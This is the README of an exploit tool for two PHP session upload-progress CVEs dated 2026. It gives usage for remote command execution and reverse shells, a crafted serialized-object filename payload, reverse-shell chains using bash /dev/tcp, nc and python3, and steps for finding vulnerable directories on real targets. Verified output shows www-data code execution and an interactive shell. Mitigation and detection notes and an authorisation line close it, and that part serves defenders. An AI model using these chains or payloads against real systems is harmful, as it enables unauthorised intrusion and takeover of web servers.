# php2shell — CVE-2026-109618 / CVE-2026-109619

Single-file exploit
```
./exploit.py http://target/                    scan only (default, no flags)
./exploit.py http://target/ -c 'id'            single command
./exploit.py http://target/ -i HOST -p PORT    reverse shell
```

Verified working: `uid=33(www-data)` and an interactive shell, against a PHP-FPM target. See **Verified results** below.

---

## Read this first: what is and is not the CVE

Both CVEs live in PHP's `session.upload_progress` handler, which runs **before** any application code, during request startup. Two primitives come out of it:

1. **Session id from a body field.** A form field named `PHPSESSID` sets the session id before the script runs. No cookie needed; `session.use_only_cookies` does not cover this path.
2. **Attacker-controlled session content.** `PHP_SESSION_UPLOAD_PROGRESS` becomes the session key `upload_progress_<value>`, and the upload **filename** is stored verbatim in `files[i].name`.

Neither is memory corruption. Neither is RCE on its own. Code execution needs one more thing on the target, and this tool implements the two that exist:

| chain | needs | works on patched PHP? |
|---|---|---|
| **A. handler mismatch** (default for `-c`/`-i`) | two dirs with different `session.serialize_handler` + a class with `__destruct` | **yes** — separate logic bug |
| **B. session poisoning + include** (`--lfi`) | an `include()`/`require()` sink taking a path | **yes** — application bug |

```
./exploit.py --help    # full flag reference
```

### Honest note on the memory-corruption reading

The advisories describe OOM/stale-state memory corruption. That did **not** reproduce here, and the tool does not pretend otherwise:

- bodies that exceed `memory_limit` during startup kill the worker on FCGI/FPM, so nothing survives to be consumed;
- on mod_php the child survives, but the record the handler publishes is a session **name** (`session.c:3204` uses `progress->key` as the key), and a name is decoded as raw bytes (`session.c:1136`) while only the value is unserialized. A serialized object placed there never becomes an object. Measured: `valtype=array, objects=0`.

So `-c`/`-i` use the handler-mismatch chain. Scan reports version only.

---

## Proving the version

A web server usually has no `php` binary — PHP is a module or CGI. `php --version` failing does not mean PHP is absent.

```
# 1. fastest, unauthenticated
curl -sI http://target/ | grep -i x-powered-by
X-Powered-By: PHP/8.2.35

# 2. when expose_php=Off (mod_php)
strings /usr/lib/apache2/modules/libphp*.so | grep -oE 'php-8\.[0-9]+\.[0-9]+'

# 3. php-cgi / php-fpm
/usr/bin/php-cgi -v   ||   php-fpm -v

# 4. confirm the module is really loaded, not just present
apache2ctl -M | grep -i php
grep -l libphp /proc/$(pgrep -o apache2)/maps

# 5. from the tool
./exploit.py http://target/
```

A version string in a file means nothing unless the running server loads it.
Check both.

### Fixed versions

```
8.5.12    8.4.27    8.3.36    8.2.35
```

Affected: 5.4 → 8.5.11, plus every EOL branch (no upstream fix exists).

---

## Chain A — handler mismatch (what `-c` and `-i` use)

One session file, two directories, two serializers.

```
/app   session.serialize_handler = php_serialize
/api   session.serialize_handler = php          (default)
both share session.save_path
```

### How it works

```
STEP 1  POST /app/upload.php
        multipart body:
          PHPSESSID                 = <sid we pick>   (form field, not cookie)
          PHP_SESSION_UPLOAD_PROGRESS = x
          file part, filename       = x|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}

        php_serialize writes $_SESSION as one array, and our filename sits inside it verbatim as a string:

          a:1:{s:17:"upload_progress_x";a:5:{...s:4:"name";s:36:"x|O:4:\"Evil\"...";...}}

STEP 2  GET /api/endpoint.php   Cookie: PHPSESSID=<sid>

        The `php` handler splits the file at the FIRST "|", so:
          name  = upload_progress_x
          value = a:5:{...}            <- but the object is inside it and because our "x|" is nested in the filename, the deserializer reaches O:4:"Evil" and instantiates it inside session_start(). The rest of the decode fails -> PHP_VAR_UNSERIALIZE_DESTROY runs on both paths -> __destruct() fires -> command executes.
```

### The gadget

The class must exist in the **reading** app. Any class with a useful `__destruct` works; nothing has to be written for the attack.

```
--gadget-class Evil --gadget-prop cmd
```

Payload property names depend on the class. On a real target use the framework chain that is already there (Laravel `PendingBroadcast`, Symfony `TagAwareAdapter`, a WordPress plugin object, ...).

**The gadget decides what "execution" means.** A cache class that writes a file will happily receive `id` as a filename and produce no shell. Pick a class whose destructor actually calls `system()`/`shell_exec()`/`exec()`.

### Finding the two directories on a real target

Look for legacy config, in this order:

1. `.htaccess` or `php_value`/`php_admin_value` setting `session.serialize_handler` to `php_serialize` — many "safer sessions" guides recommend it
2. a PHP-FPM pool where one directory gets a different `php_value` block
3. an app with two entry points deployed at different times
4. any code path calling `ini_set('session.serialize_handler', ...)` — under FPM the change sticks to the worker for its whole life

Confirm by probing: send a small multipart with `PHP_SESSION_UPLOAD_PROGRESS` to each candidate and look at the session file. `php_serialize` stores `a:1:{...}`; `php` stores `name|value` lines.

If the target has no mismatch, chain A does not apply. Do not force it.

### Docker / NAT note

If the target is in a container, `-i 127.0.0.1` cannot reach your listener inside the container that address is the container itself.

```
docker network inspect <net> -f '{{range .IPAM.Config}}{{.Gateway}}{{end}}'
# then: -i <that gateway>
```

---

## Chain B — session poisoning + include (`--lfi`)

When the target has an LFI sink, PHP code is placed in the session file and the sink includes it:

```
./exploit.py http://target/ -c 'id' --lfi '/lfi.php?page=/tmp/sessions/sess_SID'
```

Use the literal placeholder `SID` — the tool substitutes the session id it generated, so you do not have to run twice or know the path in advance. It also prints the resulting file name:

```
[*] session file is sess_p2s927a0071... in the target's session.save_path
[*] attempt 1/5  include HTTP 200 (410 B, 0.01s)
[+] RCE confirmed via session poisoning + include

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command is embedded in the payload, so `$_GET['c']` is not required. Works on patched PHP because it is an application bug, not a PHP bug.

Requires `session.upload_progress.cleanup=0`, otherwise the key is deleted at the end of the request and the poison only exists mid-upload.

---

## Reverse shell payload

`shell_exec()` waits for the command to finish, and an interactive shell never does. The payload therefore detaches itself (`setsid`, stdin closed) so the PHP request completes while the socket stays open. 
Four transports are chained because minimal containers lack bash, nc or python3:

```
setsid bash /dev/tcp  ->  setsid sh /dev/tcp  ->  fifo+nc  ->  python3 pty
```

```
# terminal 1
nc -lvnp 4444

# terminal 2
./exploit.py http://target/ -i <your-ip> -p 4444 --app-path /app/upload.php --api-path /api/endpoint.php --gadget-class Evil --gadget-prop cmd
```

---

## Verified results

PHP 8.2.35 (already patched) behind nginx + php-fpm, single worker:

```
$ ./exploit.py http://127.0.0.1:18080/
  php              8.2.35  (via X-Powered-By)
  sapi             fpm-fcgi
[+] NOT VULNERABLE — PHP 8.2.35 >= 8.2.35

$ ./exploit.py http://127.0.0.1:18080/ -c 'id; uname -s'
[*] attempt 1/5  write HTTP 200  read HTTP 200
[+] RCE confirmed via handler mismatch

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux

$ ./exploit.py http://127.0.0.1:18080/ -i 172.19.0.1 -p 9004
[+] payload delivered; check your listener

$ nc -lvnp 9004
connect to [172.19.0.1] from (UNKNOWN) [172.19.0.2] 51000
www-data@34b899b07777:~/html/api$

$ ./exploit.py http://127.0.0.1:18080/ -c 'id' --lfi '/lfi.php?page=/tmp/sessions/sess_SID'
[+] RCE confirmed via session poisoning + include

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Note what the scan said: **NOT VULNERABLE**. The version is patched, and both chains still give code execution — that is exactly why they are labelled separately throughout this tool.

---

## Lab

`lab2/` is the victim side, mirroring a real deployment:

```
lab2/webroot/app/upload.php      php_serialize directory (.user.ini)
lab2/webroot/api/endpoint.php    php directory + Evil class
lab2/webroot/lfi.php             include sink for chain B
lab2/docker-compose.yml          nginx + php-fpm, pm.max_children=1
lab2/php.ini                     memory_limit 32M, cleanup=0
```

One worker (`pm.max_children=1`) makes the mismatch deterministic instead of a coin flip.

```
cd lab2 && docker compose up -d
curl http://127.0.0.1:18080/
```

**`lab2/webroot/api/endpoint.php` ships an `Evil` class with a `__destruct` that runs a command.** It is a lab gadget standing in for the framework POP chain a real target already contains. It is the only lab-specific piece; the exploit itself needs nothing added to a target.

---

## Tuning

```
--app-path         php_serialize endpoint     (default /app/upload.php)
--api-path         php endpoint               (default /api/endpoint.php)
--lfi PATH         include sink (chain B)
--gadget-class     class with __destruct      (default Evil)
--gadget-prop      property carrying command  (default cmd)
--progress         upload progress value      (default x)
--tries N          attempts                   (default 5)
--sid SID          fixed session id
--timeout SEC      per-request timeout        (default 25)
--insecure         skip TLS verification
--json             machine-readable scan
```

Exit codes: `0` clean/success, `1` undetermined or chain failed, `2` vulnerable version, `64` bad arguments.

---

## Mitigation

For the CVEs:

- patch to 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (or vendor backport), every worker
- `session.upload_progress.enabled=0` if the feature is unused
- keep `session.upload_progress.cleanup=1` (stock) — do not relax it
- `fatal_error_backtraces=0` on PHP 8.5

For the chains (still open after patching):

- keep `session.serialize_handler` identical across all directories; `php_serialize` is safer because `|` in attacker data cannot split a record
- never build `include`/`require` paths from request data
- do not let user-controlled filenames reach session progress records

Detection: session files containing `upload_progress_` and `<?php`, anomalous multipart requests followed by `PHP Request Startup:` warnings, oversized or malformed `PHPSESSID` cookies.

---

## Authorisation

For systems you own or are explicitly authorised to test. The lab here is local; nothing in this repository attacks third-party hosts.
